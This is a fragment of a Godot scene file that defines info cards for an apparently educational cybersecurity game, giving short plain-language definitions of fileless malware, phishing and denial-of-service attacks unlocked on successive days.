[node name="Title" parent="CyberAttackCards/VBoxContainer/Fileless_card/MarginContainer/VBoxContainer" index="0"]
text = "Fileless"

[node name="Label" parent="CyberAttackCards/VBoxContainer/Fileless_card/MarginContainer/VBoxContainer" index="3"]
text = "Fileless malware never writes a new file to disk. It runs in memory or hides inside built in system tools like scripting hosts and scheduled tasks so signature based scanners often miss it, and defenders must watch behavior, memory activity, and suspicious command lines to catch it."

[node name="Phishing_card" parent="CyberAttackCards/VBoxContainer" instance=ExtResource("11_woodw")]
layout_mode = 2
unlocked_day = 4

[node name="Title" parent="CyberAttackCards/VBoxContainer/Phishing_card/MarginContainer/VBoxContainer" index="0"]
text = "Phishing"

[node name="Label" parent="CyberAttackCards/VBoxContainer/Phishing_card/MarginContainer/VBoxContainer" index="3"]
text = "A trick where attackers pretend to be someone you trust to steal credentials or data, usually via fake emails or links that ask you to log in or share sensitive information."

[node name="DoS_card" parent="CyberAttackCards/VBoxContainer" instance=ExtResource("11_woodw")]
layout_mode = 2
unlocked_day = 5

[node name="Title" parent="CyberAttackCards/VBoxContainer/DoS_card/MarginContainer/VBoxContainer" index="0"]
text = "Denial of Services"

[node name="Label" parent="CyberAttackCards/VBoxContainer/DoS_card/MarginContainer/VBoxContainer" index="3"]
text = "An attack that overwhelms a server or network with traffic or requests so legitimate users cannot access the service, causing outages or slowdowns until the attack stops or defenses kick in."

[node name="AnimationPlayer" type="AnimationPlayer" parent="."]
